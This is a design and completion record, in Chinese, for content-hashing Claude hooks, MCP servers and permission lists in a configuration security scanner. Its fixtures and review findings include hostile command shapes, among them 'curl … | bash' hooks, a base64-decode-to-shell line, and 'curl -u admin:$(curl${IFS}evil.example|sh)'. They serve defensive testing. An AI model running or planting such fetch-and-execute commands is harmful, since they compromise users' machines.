<!-- SPDX-License-Identifier: MIT -->
# 009 — hook、MCP、permission 没有哈希,闸门和信誉库对它们恒"不认识"

- **来源**:hook、MCP 服务器和权限列表的 artifact 哈希为空,闸门的 SessionStart 和信誉库按哈希识别内容,对这三类恒判为未知;
  同一份配置在两台机器上也没有共同的身份。移植自旧仓 agent-guard 的 P-051(私有仓)
- **依赖**:无
- **分支**:`p/009-content-hash-three-kinds`

<!-- 没有「状态」行:文件所在目录就是状态(draft/ design/ complete/ rejected/),见 README.md。 -->

## 问题

`ArtifactReport.Hash` 是信誉库和闸门批准共用的 key(`.claude/rules/hash.md`)。skill、plugin、单文件、connector 都有;
**hook、MCP server、permission 三类从来没有** —— 采集时就写死了空串:

| 位置 | 写进 Hash 的 |
|---|---|
| `internal/collect/hooks.go:64`(每条 hook,settings.json 和插件自带的都走这里) | `""` |
| `internal/collect/collect.go:485`(每个 MCP server,`~/.claude.json`、项目 `.mcp.json`、插件 `.mcp.json`) | `""` |
| `internal/collect/collect.go:549`、`:553`(`permissions` allow/deny,和 `settings env` 块) | `""` |

而每个消费方都把 `""` 读成"没人审过":

- `gate.Store.Approved("")` 恒 false(`internal/gate/approvals.go:129-135`,`TestEmptyHashIsNeverApproved` 钉着),
  `Store.Approve` 遇到 `""` 直接返回、什么都不存(`approvals.go:167-175`);
- `reputation.DB.Match("")` 恒 false(`internal/reputation/reputation.go:111-117`);
- 闸门 `SessionStart` 按 `Approved(a.Hash)` 跳过已批准的(`internal/gate/hook.go:381`),这三类永远跳不过;
- `aguard hash <root>` 对这三类打印空哈希(`cmd/aguard/main.go:827`)。

后果:

- **这三类是闸门管不住的那一半**(从会话第一轮就活着,没有加载事件),却也是唯一一类**连"认识"都做不到**的:
  同一份配置、同一条 hook,每台机器、每次会话都是"新的";信誉库里也无法为它们录入任何一条(`reputation.New` 丢掉空 key 的条目)。
- **`aguard approve <root>` 在最差 artifact 是 hook/MCP/permission 时打印 `approved … hash ` 然后什么都没存** ——
  `Approve` 把空 key 静默丢掉了。

用 `main`(`dec64ca`)构建的二进制对一个临时 root 手跑(2026-10-09):一条 `PreToolUse[Bash]` hook 跑 `sh ~/.claude/hooks/pre.sh`,
脚本里是 `curl … | bash`:

```
aguard hash <root>          →   "  hook:PreToolUse[Bash]#1"(哈希一栏是空的)
aguard approve <root>       →   approved hook "PreToolUse[Bash]#1" (75/100, accepted-risk)
                                  hash                                  ← 空
                                exit 0;.aguard-approvals.json 里 "approvals": {}
SessionStart                →   照样列出 hook PreToolUse[Bash]#1 75/100 EXEC-001
```

真机(本机 `~/.claude`,2026-10-09,同一个 `main` 二进制):hook 29 个、MCP 27 个、permission 2 个,**58 个 Hash 全是空串**;
其余 117 个 artifact 都有哈希。

## 初步方向

在 detect 阶段(`Redact` 和脚本跟进都在那里;collect 不能 import detect)给这三类算一个**按内容的**哈希:
带 kind 前缀做域分离,不含 `OwnerRoot` 和任何本机绝对路径,MCP/permission 用排序键的规范 JSON,
secret 值先脱敏(哈希会印进 JSON、存进 approvals,不能是凭据的摘要);hook 的哈希包含它跟进的脚本内容。
`TreeHash`/`FileHash` 一字不动(信誉条目和已存批准全靠它们)。在 `analyze()` 里先于信誉、闸门、`approve` 填好;`aguard hash` 同步。

## 设计

一个函数 `detect.ContentHashes(root, arts)`,返回副本,只给 Hash 为空、且不带 `PARSE-000`(`SrcParseError`)的
hook / mcp / permission artifact 填值;别的 kind 原样返回。`analyze()` 在 `detect.Run` 之后**紧接着**调它,
在 permcheck、信誉、ignore、判官之前 —— 闸门的 `SessionStart`(经 `scanEnv`)、`aguard approve`(经 `checkTarget`)、
Downloads 那一路(经 `checkTarget`)全在它后面。`aguard hash` 在 `CollectTarget` 之后调同一个函数。

**定义**:`hex(sha256(<域> 0x00 <规范 JSON>))`。

| 种类 | 域 | 规范 JSON 里有什么 | 明确不含 |
|---|---|---|---|
| hook(command) | `aguard:hook:v1` | `event`、`matcher`、`entry`:这条 hook 自己的 JSON 对象**整个**(collect 原样留在 `Hook.Entry`,脱敏视图)、`scripts`:命令里每个脚本引用按出现顺序一项 | artifact 名(`#n` 序号、插件后缀)、settings 文件路径、`OwnerRoot`、脚本的解析后路径 |
| hook(http) | `aguard:hook:v1` | `event`、`matcher`、`entry`(同上) | 同上 |
| mcp | `aguard:mcp:v1` | `mcpServers.<key>` 整个条目,所有字符串值取脱敏视图 | server 名(它是标签,和 skill 目录名不进树哈希同理)、文件路径 |
| permission | `aguard:permission:v1` | `{"permissions": <整个 permissions 对象,脱敏视图>, "scripts": [allow 条目引用的脚本]}` | 作用域后缀、文件路径 |
| settings env | `aguard:settings-env:v1` | `env` 对象,值取脱敏视图 | 同上 |

- **`scripts` 的每一项**:跟进方式与 `hookUnits` / `permissionUnits` 完全同一套(`resolveHookScript`,失败再
  `resolveInOwnerRoot`;解析成功但不在 HOME 内不读)。读到 → `"sha256:<collect.FileHash>"`(流式、拒非常规文件、
  不受 1 MiB 扫描上限影响);路径有变量/glob 或没有这个文件 → `"unresolved"`;在 HOME 外 → `"outside-home"`;
  存在但读不了 → `"unreadable"`。**三个标记互不相同**,理由与 `TreeHash` 的 `unreadableMark` 同一条:"没有 X"和
  "X 读不了"不能同 key。永远不会因此得到空哈希。
- **规范 JSON**:`json.Decoder.UseNumber`(数字保留原文)、`encoding/json` 排序键、`SetEscapeHTML(false)`、
  数组保序。**不是 RFC 8785 / JCS**(见「不能说什么」)。
- **脱敏视图**:`Redact` 的**凭据那一半**(URL 里的密码、`-u user:pass`、`--token x`、key 宣告的赋值、
  已知前缀 token),**不含高熵兜底**;**替换只许忘掉 secret,不许拿走结构**(未决 3、11):一次替换若会抹掉结构字符,这个值
  原样进哈希。结构按读它的东西定 —— shell 值(hook 的 command;MCP 条目的 `command` 与 `args`;permission 条目 `Tool(…)`
  括号里的模式)是 `` $ ` ( ) ; | & < > \ * ? # [ ] { } ``,其余值是 URL 分隔符 `# ? \`。对象里的字符串值以 `KEY=VALUE`
  的形式过一遍(env 的 key 才是信号,`DB_PASSWORD=hunter2` 单看 `hunter2` 谁都认不出);数组里紧跟在 `-` 开头元素后面的值
  以 `flag value` 的形式过(`["--api-key", "…"]`)。
- **为什么先脱敏**:哈希会印进 `--json` 报告、存进 approvals 文件,一个低熵 secret 的摘要是谁都能暴力还原的承诺
  (W-006 那条:任何 Hash 都不能是凭据的摘要)。approvals 和信誉库按内容建 key,哈希不必、也不该绑住某台机器上的那个 secret。
- **`Redact` 本身一字节行为不变**:拆成 `redactCredentials`(凭据那一半)+ `redactEntropy` 两步,`Redact = redactEntropy(redactCredentials(s))`。
- **插件自带的 MCP server**:artifact 名带 ` (plugin …)` 后缀,配置里的 key 没有。`ArtifactReport` 加一个不序列化的
  `MCPServer`(collect 填 key),哈希按它找条目(未决 6)。
- **root 先 `filepath.Abs`**(未决 10、11):`--root ~/.claude/` 的尾部斜杠会让 home == root,`aguard hash .` 会让
  home 是 `.`,`~/…` 的脚本都解析到错的目录,同一份配置因为路径怎么敲而有两个身份。

## 完成的判据

- [x] `TestContentHashGolden`(`internal/detect/contenthash_test.go`,新):五个固定 fixture(跟进一个脚本的 command hook、
  http hook、MCP server、permissions、settings env)→ 规范输入**字节**等于字面串、哈希等于字面常量。哈希可以
  **手算**:`printf 'aguard:hook:v1\0%s' '<字面串>' | shasum -a 256`。W1 编译红(没有 `ContentHashes`)
- [x] `TestContentHash_SameConfigTwoMachines`(同文件,新):同一 hook 配置 + 同样内容的脚本放在两个不同 home 下;
  同一插件 hook 在两个不同 `OwnerRoot` 下;同一 MCP 条目在两个不同路径的文件里、改了 server 名 → 哈希两两相等且非空;
  root 带尾部斜杠、写成 `.` → 同一个哈希
- [x] `TestContentHash_HookFollowsItsScript`(新):改 settings hook 跟进的脚本 / 插件 hook 在自己树里跟进的脚本 → 哈希变
- [x] `TestContentHash_ScriptThatCannotBeReadIsMarked`(新):脚本 `chmod 000` → 哈希非空,且不同于可读时、不同于脚本不存在时;
  不存在 / 路径带变量 → `unresolved`;解析到 HOME 外 → `outside-home`;三个标记两两不同(root 运行时跳过 `chmod` 那半)
- [x] `TestContentHash_SecretsAreNotDigestInputs`(新):MCP env `DB_PASSWORD`、`Authorization` 头、hook 命令里的 `-u admin:…`、
  URL 里的密码 —— 两个不同 secret 得到**同一个**哈希,等于把它写成 `<REDACTED>` 时的哈希,规范输入里不含 secret 原文
  (**有意为之**:只改 secret 不重键)。同一测试里的反向:URL 密码位置换成 `$(…)` → 哈希变;一个没有 key 宣告的
  base64 载荷换掉 → 哈希变;改一个非 secret 参数 → 哈希变
- [x] `TestContentHash_ReplacementNeverTakesStructure`(新,未决 11):对照组 —— 精确授权里的密码、授权里的 token、
  MCP url 里的密码,两个不同 secret 仍同哈希、不进输入;反向 —— `Bash(curl -u admin:hunter2)` → `…admin:*)`、
  `Bash(deploy --token abc123)` → `…--token *)`、MCP / http hook 的 url 里"密码"换成 `443#` / `443?` 把 host 换掉、hook 命令密码位
  换成 glob、同一命令换 hook type、同一条目加一个字段 —— 七对全部重键,且对着不带结构守卫、只哈希四个字段的实现全红
- [x] `TestContentHash_KindsAreDomainSeparated`(新):同一份规范字节在四个域下 → 四个互不相同的值,且都不等于这份字节的裸 sha256
- [x] `TestReputation_RecognisesAHook`(`cmd/aguard/contenthash_test.go`,新):扫一个带 hook 的 fixture,用它的 hook 哈希造一条
  `malicious` 信誉条目 → 那条 hook 得到 `REP-BAD`。W1 红(哈希是空串,`reputation.New` 直接丢掉这条)
- [x] `TestGate_ApprovedHookLeavesSessionStart`(`cmd/aguard/gate_e2e_test.go`,新):root 里一条跟进 `curl | bash` 脚本的 hook;
  `approvePath(root)` 之后 approvals 里**有一条** hook 记录,`SessionStart` 不再列它;再改它跟进的脚本 → `SessionStart` 又列出来。
  W1 红:打印 `approved` 而 approvals 为空,`SessionStart` 照列
- [x] `TestHashCommand_PrintsConfigHashes`(`cmd/aguard/contenthash_test.go`,走真二进制,新):`aguard hash <root>` 每一行
  hook / mcp / permission 都是 64 位十六进制,且等于 `scan --json` 里同一 artifact 的 `hash`。W1 红(空)
- [x] 反向断言 `TestScan_OnlyConfigHashesChange`(`cmd/aguard/contenthash_test.go`,新,随 W5 落地):同一 fixture(hook、两处 MCP、
  permissions、env、skill、CLAUDE.md)关掉/打开这一步各扫一次,把三类的 `hash` 置空后 JSON **逐字节相同**;
  其余 kind 的 `hash` 一个不变
- [x] 反向断言 `TestContentHash_ParseErrorArtifactsStayUnhashed`(新):坏掉的 `settings.json` / `.claude.json` → `PARSE-000`
  artifact 的 Hash 仍是 `""`;`TestEmptyHashIsNeverApproved` 不改一字仍绿
- [x] 反向断言不改一字仍绿:`TestHashGolden`(两个常量)、`TestAdversarial_ConcurrencyDoesNotChangeOutput`、
  `TestRun_ConcurrentDeterministic`、`TestImports_CredentialFileRefused`(W-006)、`internal/detect/redact_test.go` 全部。
  (`TestCollectHooks_PerCommand` 是整体比较 `model.Hook` 的,`Hook` 多了 `Entry` 之后改成比较前先清掉它,并新加一句断言
  `Entry` 等于原文 —— 原来的四个字段断言一个没少)
- [x] 真机:`scan --root ~/.claude --quiet --json` 前后对比,**只有** hook / mcp / permission 的 `hash` 不同;记数字不记名字
- [x] `make verify` 绿;`go version` 无工具链切换

## 不做什么

- **`TreeHash` / `FileHash` / `ExcludeFromHash` / `connectorHash` 不动**:`internal/collect/hash.go`、`hash_test.go`、`skip.go`、
  `connectors.go` 的 diff 为空。信誉条目和已存批准全靠它们
- **不改任何发现、分数、note**:差分测试 + 真机对比证明;**插件自带 MCP server 扫不到规则这个已有缺口不在这里修**(未决 6)
- **闸门代码不动**(`internal/gate` diff 为空):不新增批准入口、不新增写批准的路径;`SessionStart` 仍然只告知、不拦
- **`approvePath` 不动**:对仍然是空哈希的 artifact(`PARSE-000` 那几个)它照旧打印 `approved` 而什么都不存 —— 由 P-011 单独处理
- **信誉数据不动**:`internal/reputation/data/reputation.json` 不加这三类的条目
- **不哈希 MCP server 的代码**(npx 包、args 里的本地脚本):detect 本来也不跟进它们,只哈希配置条目
- **不哈希整个 `settings.json` / `.claude.json`**:多个 artifact 共用一个文件、`.claude.json` 每次会话都变、
  而且会和 `aguard approve settings.json` 存的文件哈希相等
- **不为哈希去读 HOME 外的脚本**(不变量 #2):只记 `outside-home`
- **不改写命令文本**:命令里写死的绝对路径照原样进哈希,不替换成 `~`
- **`--root` 带尾斜杠 / 相对写法时 detect 跟不进 hook 脚本的漏报不在这里修**(未决 10,P-010)
- 人类可读报告(text / markdown / html / sarif)不出现任何新内容(`internal/report` diff 为空;它们本来就不印哈希);
  `internal/judge` 不动;不加依赖,`go.mod` / `go.sum` 不动;`docs/install-gate.md` 对子不动(没有新的用户操作)

## 不能说什么

- **不说"改任何一个字节都会重新问"**。被脱敏替换掉的那一段(key 宣告的 secret 值、已知前缀 token、URL / flag 里的密码,
  且不含结构字符)改了不换哈希 —— 有意为之(决定 1)。**也不说"这样绝不会静默放行"**:一个在批准时就已经
  "把凭据名变量解码再执行"的配置,把编码在那段值里的载荷换掉,哈希不变;MCP 的 env / header 如果被 server 自己拿去
  eval,同理。高熵兜底不进哈希视图、带结构字符的替换原样保留,堵的是 base64 换载荷、`$(…)` / glob / 授权通配 / URL 换 host
  这几种(未决 3、11);剩下的都要求被批准的那份配置本身就在做"解码 / 求值一个凭据值"
- **不说"secret 不会进哈希"**,只说"`Redact` 认得出的不会"。`Redact` 是尽力而为:`MYSQL_PASS=hunter2`(`credKeys` 里没有
  `pass`)、`--db-password hunter2`(`flagSecretRE` 要求紧跟 `--password`)、`mysql -phunter2` 都认不出,这些值原样进摘要输入,
  而摘要可以被暴力还原(未决 11)。补它要改 `redactCredentials`,会让三类全部重键,也会改报告里的 snippet,另开
- **不说"hook 的哈希覆盖它运行的一切"**:脚本在 HOME 外、路径里有变量、读不了时,哈希里只有一个标记,脚本本身改了哈希不变;
  MCP 的哈希只覆盖配置条目,不覆盖 server 的代码
- **不说"这三类永远不可能和文件哈希相等"**:单文件哈希是任意字节的 sha256,一个字节恰好是"域 + 0x00 + 规范 JSON"的文件会同值。
  和树哈希、和彼此相等需要 sha256 碰撞
- **不说规范 JSON 是 RFC 8785 / JCS**:数字保留原文(JCS 会规范化)、`\b` `\f` 写成 `\u0008` `\u000c`、键按 UTF-8 字节排序
  (JCS 按 UTF-16)。谁要在别处重算这个哈希,要照本仓库的定义,不是照 JCS
- **不说"闸门现在管得住 hook / MCP"**:本条只让"已批准"对这三类有了意义。也不说"可以单独批准一条 hook":唯一入口仍是
  `aguard approve <root>`,它取最差的那个 artifact
- **不说"同一配置在所有机器上同哈希"**:命令里写死的绝对路径、没有 key 宣告的高熵 token 本身就让配置不同
- **不说插件自带的 MCP server 被规则扫过**(它没有,见未决 6)

## 工作项

| W | 一句话 | 提交信息(不写 sha,rebase 会改) |
|---|---|---|
| 1 | detect 六条性质测试 + 两条反向(编译红);cmd 三条用户可见的测试(断言红) | `detect, cmd: tests — hooks, MCP servers and permissions hash to "", so approve stores nothing, SessionStart can never skip them and no reputation entry can match (P-009)` |
| 2 | `Redact` 拆成凭据那一半 + 高熵兜底,行为一字节不变 | `detect: Redact is the credential half plus the entropy catch-all, so a hash can take the first without the second (P-009)` |
| 3 | `ArtifactReport.MCPServer`(不序列化),collect 填 key | `model, collect: an MCP artifact carries its server's key, because a plugin server's name has a suffix the config does not (P-009)` |
| 4 | `detect.ContentHashes`:四个域、规范 JSON、脱敏视图、脚本摘要与三个标记 | `detect: hooks, MCP servers and permission lists get a content hash — domain-separated, path-free, secrets out, the followed script in (P-009)` |
| 5 | `analyze()` 在 Run 后紧接着填;`aguard hash` 同步;差分测试 | `cmd: scan, check, the gate and aguard hash see the content hash before anything reads it (P-009)` |
| 6 | spec §4 表与 §8 Hash 作用域;`.claude/rules/hash.md`(加 paths 与定义、重键后果);`gate.md` 的 SessionStart;architecture 对子 | `docs: spec, hash.md, gate.md and the architecture pair define the three content hashes and what re-keys them (P-009)` |
| 7 | 评审修正(未决 11):hook 哈希整个条目(`Hook.Entry`);替换不许拿走结构(按 shell / 授权 / 字面三种读法);root 取 `Abs` | `detect, collect: widening a grant, moving a URL's host or changing a hook's type now re-keys, and how the root was typed no longer does (P-009)` |
| 8 | `CLAUDE.md` 的加载表:`hash.md` 现在也管 `internal/detect/contenthash*.go` | `docs: CLAUDE.md's loading table names the content-hash file hash.md now covers (P-009)` |
| 9 | 本文件、索引 | `proposals: P-009 (P-009)` |

## 未决问题

1. **在哪一层算、secret 怎么处理?**
   **已决(2026-10-09,人)**:在 detect 阶段算(`Redact` 和脚本跟进都在那里),哈希前先脱敏(hook 的 command / url,MCP 的
   command / args / env / url / headers 值,settings env 块的值)。要如实写出的后果:`Redact` 的改动会让这三类重键 ——
   方向是安全的(多一次询问 / 复查,不会静默放行)。落地时精确到:改 `redactCredentials`(凭据那一半)会重键;改高熵兜底不会(未决 3)。
2. **hook 的哈希含不含它跟进的脚本?**
   **已决(2026-10-09,人)**:含,用 detect 现有的同一套跟进;读不了 / 解析不了 → 固定标记进哈希输入,绝不是空哈希,
   也绝不是悄悄只剩条目本身,与 `TreeHash` 对读不了的条目的做法一致。
3. **哈希用 `Redact` 的全部,还是只用凭据那一半?**
   **建议**:只用凭据那一半;会被 shell 解释的值再加一道元字符守卫。两个实测形状(本仓库 `main` 的 `Redact`,2026-10-09):
   `echo <base64> | base64 -d | sh` → `echo <REDACTED> | base64 -d | sh`,两个不同载荷得到同一个视图;
   `curl -u admin:$(curl${IFS}evil.example|sh) …` → `curl -u admin:<REDACTED> …`(字符类是 `[^\s'"]+`),同样不变。
   而高熵串本来就不怕被摘要泄露 —— 摘要只泄露猜得出的东西,W-006 防的是 `hunter2` 这类低熵 secret,它们全靠
   key / flag / URL 那几条抓。守卫只加在 shell 会解释的值上:那里一个未加引号、能被替换的片段里出现 `$(`,它就是代码不是
   字面密码;env、header、url 里的 `pa$$w0rd` 是字面值,照常替换。代价:没有 key 宣告的高熵 token 让两台机器上"同一份
   配置"不同哈希 —— 方向安全(信誉不匹配、批准不覆盖,多问一次),不是静默放行。
   **已决(2026-10-09)**:按建议。**人确认(2026-10-09)**:接受这两处对决定 1 的收窄(只用凭据那一半;替换不许拿走结构)。
4. **permission 的哈希含不含 allow 条目引用的脚本?**
   **建议**:含,和 hook 同一套跟进与标记。这个 artifact 上的发现有一部分**来自那些脚本**(`permissionUnits`);批准不绑它们,
   就等于"脚本改了、发现变了、批准照旧"。只跟 allow(与 `permissionUnits` 一致)。
   **已决(2026-10-09)**:按建议。
5. **名字进不进哈希?**
   **建议**:不进。hook 的 `#n` 序号和插件后缀、MCP 的 server 名都是标签,和 skill 目录名不进树哈希同理;`event` / `matcher`
   进,因为它们决定什么时候跑。后果:同一 event 下两条一样的 hook 同哈希(批准绑的是字节)。
   **已决(2026-10-09)**:按建议。
6. **插件自带 MCP server 的条目怎么找?**
   **建议**:`ArtifactReport` 加不序列化的 `MCPServer`,collect 填配置里的 key,哈希按它找;**检测这次不跟着改**。顺带实测到
   一个已有缺口(本仓库 `main`,2026-10-09):插件 MCP artifact 的名字带 ` (plugin …)` 后缀,`unitsFor` 用名字去 `mcpServers` 里找条目,
   **找不到,零 unit** —— 同一个 `bash -c "curl … | bash"` 条目,写在 `~/.claude.json` 里得 75 分 `EXEC-001`,写在插件 `.mcp.json` 里
   (`evil (plugin p@mkt)`)得 100 分零发现。`mcpServersFrom` 的注释自己写着"名字带装饰就会 miss、零 unit、记成干净的 100"。
   修它会改发现和分数,另开 proposal。
   **已决(2026-10-09)**:按建议。
7. **读不了的脚本用一个标记还是按原因分?**
   **建议**:分三个(`unresolved` / `outside-home` / `unreadable`)。一个标记会让"脚本不存在"和"脚本在但读不了"同 key —— 正是
   `TreeHash` 当年改掉的那种。
   **已决(2026-10-09)**:按建议。
8. **在 `Run` 里面填,还是在 `analyze()` 里 `Run` 之后填?**
   **建议**:`analyze()` 里紧跟 `Run`。`Run` 的另一个调用方(`clean` 的恢复预览)不读哈希;放在 `analyze()` 里,`cmd/aguard` 可以用一个
   包级变量(`termraw.go` 的先例)把这一步关掉,差分测试才证明得了"只动了 hash"。
   **已决(2026-10-09)**:按建议。
9. **`aguard approve <root>` 的行为变化算不算越界?**
   **建议**:不算,照实写。以前最差 artifact 是 hook / MCP / permission 时它打印 `approved … hash ` 而什么都没存(「问题」一节的手跑);
   现在存下那条哈希,`SessionStart` 随后不再列它。没有新增写入路径,批准仍要人敲命令;闸门 `PreToolUse` 只会在被解析的 skill 目录
   本身像 root(名叫 `.claude`)时碰到这三类,那条路的"干净即记住"规则不变。哈希仍为空的那几个(`PARSE-000`)由 P-011 处理。
   **已决(2026-10-09)**:按建议。
10. **`--root` 带尾部斜杠时,detect 跟不进 hook 的脚本 —— 哈希要不要跟着错?**
    `detect.hookUnits` 用 `filepath.Dir(root)` 当 home,没有像 `CollectAll` 那样先 `Clean`。同一个 fixture(hook 跑
    `sh ~/.claude/hooks/pre.sh`,脚本里 `curl … | bash`),本仓库 `main` 实测:`scan --root …/.claude` 得 75 分 1 条 `EXEC-001`,
    `scan --root …/.claude/` 和在 `.claude` 里 `scan --root .` 都得 **100 分 0 条** —— shell 补全就会加那个斜杠。
    **建议**:哈希这边先规范 root(两种写法同一个身份,`TestContentHash_SameConfigTwoMachines` 钉着;取 `Abs`,见 11);
    detect 的漏报**不在本条修**(会改发现和分数,越过"只动 hash"的判据),单开为 P-010。
    **已决(2026-10-09)**:按建议。
11. **独立评审(只读子代理,对着 W1–W6 的 diff)报的五条怎么处理?**
    - 阻断:**授权里的密码位能吞下授权通配** —— `Bash(curl -u admin:hunter2)` 与 `Bash(curl -u admin:*)`、`Bash(deploy --token abc123)`
      与 `…--token *)` 同哈希(`flagUserPassRE` / `flagSecretRE` 的值类 `[^\s'"]+` 吃得下 `*` 和右括号;本仓库 `Redact` 实测四个都变成
      `…<REDACTED>`,连右括号一起),批准过的精确授权被放宽成通配,`SessionStart` 照样当它已批准。
    - 应修:**URL 的"密码"段能换 host** —— `https://other.example:pw@good.example/mcp` 与 `https://other.example:443#@good.example/mcp`
      同哈希(两个都变成 `https://other.example:<REDACTED>@good.example/mcp`),后者实际连 other.example(`urlCredRE` 的值类吃得下 `#` `?` `\`)。
    - 应修:**hook 只哈希了条目的一部分** —— 非 http 一律当 `"command"`,`{"type":"prompt","command":"true"}` 与 `{"command":"true"}`
      同哈希;条目里的其他字段(timeout、header…)不在输入里。
    - 应修:**`Redact` 认不出的低熵 secret 进了摘要** —— `MYSQL_PASS`、`--db-password`、`-p<pw>`(本仓库 `Redact` 实测三者原样通过)。
    - 注:**相对 root**(`cd ~/.claude && aguard hash .`)与绝对 root 哈希不同;以及哈希与扫描各自重读文件的竞态(与 `TreeHash` 同类,已有)。
    **建议**:前三条与相对 root 在本条修(都是"批准盖住了没给人看过的字节"或"一份配置两个身份",正是本条的目标,且不动
    任何发现、分数、note):替换只许忘掉 secret、不许拿走结构 —— shell / 授权模式里的 `` $ ` ( ) ; | & < > \ * ? # [ ] { } ``,
    其余值里的 URL 分隔符 `# ? \`;permission 条目先拆开 `Tool(…)` 再按 shell 读括号里的模式;hook 哈希 collect 原样留下的整个条目
    (`model.Hook.Entry`,string,让 `Hook` 仍可比较);root 取 `filepath.Abs`。第四条不在这里修(要改 `redactCredentials`,
    重键三类 **并且** 改报告 snippet),写进「不能说什么」,另开。竞态照实写进 review 包。七对反向用例
    (`TestContentHash_ReplacementNeverTakesStructure`)对着评审前的实现应全红、修后全绿;hook 的两个 golden 按新定义重新手算。
    **已决(2026-10-09)**:按建议。**人确认(2026-10-09)**:接受这两处对决定 1 的收窄(只用凭据那一半;替换不许拿走结构)。

## 完成

手跑(「问题」一节的同一个 fixture,`main` `dec64ca` 与本分支各构建一次,每步一个进程):

```
                         修前(main dec64ca)                        修后(本分支)
aguard hash <root>       "  hook:PreToolUse[Bash]#1"(空哈希)       64 位十六进制;root 带尾斜杠 → 同一个值;root 里放上
                                                                    plugins/installed_plugins.json 后在 root 里 hash . → 同一个值(*)
aguard approve <root>    approved … hash (空);approvals {}         approved … hash 4f097648…;approvals 1 条(kind=hook,accepted-risk)
SessionStart             列出 hook PreToolUse[Bash]#1 75/100        "no unapproved artifact carries a finding at or above high"
改 hook 跟进的脚本       —                                           SessionStart 又列出它
```

(*) 没有 `installed_plugins.json` 又不叫 `.claude` 的目录,`aguard hash .` 把它当成一个 `directory` artifact 算树哈希,根本不走
root 的采集 —— 这是 `collect.looksLikeRoot` 本来的行为,与本条无关;装过插件的 `~/.claude` 都有这个文件。

```
合入:PR #29(2026-10-09;sha 用 git log --grep P-009 找)
发布:待发
证据:TestContentHashGolden(internal/detect/contenthash_test.go);W1 编译红(undefined: ContentHashes / contentHashInput / configDoc / scriptUnresolved…,unknown field MCPServer)→ W4 绿;W7 之后五个常量与两个脚本摘要在本仓库按 printf … | shasum -a 256 重新手算,七个值全部一致
证据:TestReputation_RecognisesAHook(cmd/aguard/contenthash_test.go);W1 红 "the hook has no hash, so no reputation entry can ever match it" → W5 绿:按 hook 哈希造的 malicious 条目命中,hook 上出 REP-BAD
证据:TestGate_ApprovedHookLeavesSessionStart(cmd/aguard/gate_e2e_test.go);W1 红 "approve printed success; the store holds 0 approval(s), want the hook's one" → W5 绿:approvals 1 条(kind=hook),SessionStart 不再列它;改它跟进的脚本 → 又列出来
证据:TestHashCommand_PrintsConfigHashes(cmd/aguard/contenthash_test.go,走真二进制);W1 红:mcp:db、hook:PreToolUse[Bash]#1、permission:permissions、permission:settings env、mcp:fs 五行打印空哈希 → W5 绿:五行都是 64 位十六进制,与 scan 逐个相等
证据:TestContentHash_ReplacementNeverTakesStructure(internal/detect/contenthash_test.go);把 contenthash.go 临时换回 W4 的版本(评审前的实现)跑:七对 7/7 红,另有 SameConfigTwoMachines 的相对 root 1 条红 → 还原后全绿;对照组(同一位置两个不同 secret)仍同哈希
证据:变异检查(临时改、跑、还原,未提交):去掉结构守卫 → SecretsAreNotDigestInputs、ReplacementNeverTakesStructure 红;哈希视图改用完整 Redact → SecretsAreNotDigestInputs 红(base64 那对);hook 不带脚本 → Golden、SameConfigTwoMachines、HookFollowsItsScript、ScriptThatCannotBeReadIsMarked 4 条红;unreadable 并进 unresolved → ScriptThatCannotBeReadIsMarked 红;去掉 root 规范化 → SameConfigTwoMachines 红;这一步顺手加一条 finding → TestScan_OnlyConfigHashesChange 红
证据:反向断言 TestScan_OnlyConfigHashesChange(cmd/aguard/contenthash_test.go):同一 fixture 关掉 / 打开这一步各扫一次,三类 hash 置空后 JSON 逐字节相同,其余 kind 的 hash 不变
证据:反向断言不改一字仍绿 —— TestHashGolden、TestEmptyHashIsNeverApproved、TestAdversarial_ConcurrencyDoesNotChangeOutput、TestRun_ConcurrentDeterministic、TestImports_CredentialFileRefused、internal/detect/redact_test.go 全部(所在五个测试文件与 redact_test.go 的 git diff --stat origin/main 为空);TestContentHash_ParseErrorArtifactsStayUnhashed:两个 PARSE-000 artifact 仍是 ""
证据:真机 ~/.claude(main 与本分支两个二进制背靠背各扫一次 --quiet --json):hook 29 / mcp 27 / permission 2 共 58 个 artifact 的 hash "" → 64 位十六进制(不同值 29 / 17 / 2,MCP 里同一份配置出现在多处,名字不进哈希);其余 117 个 artifact 的 hash 0 个变化;去掉 scanned_at / tool_version、把三类 hash 置空后两份 JSON 相等;overall 69 → 69,notes 10 → 10,artifact 175 → 175
证据:不做什么 —— git diff --stat origin/main -- go.mod go.sum internal/collect/hash.go internal/collect/hash_test.go internal/collect/skip.go internal/collect/connectors.go internal/gate cmd/aguard/gate.go internal/report internal/judge internal/reputation internal/score internal/permcheck docs/install-gate.md docs/install-gate.zh-CN.md docs/rules.md 为空
证据:make verify: all gates passed;go version go1.23.5(无工具链切换);go.mod 第二行 go 1.23.5
```
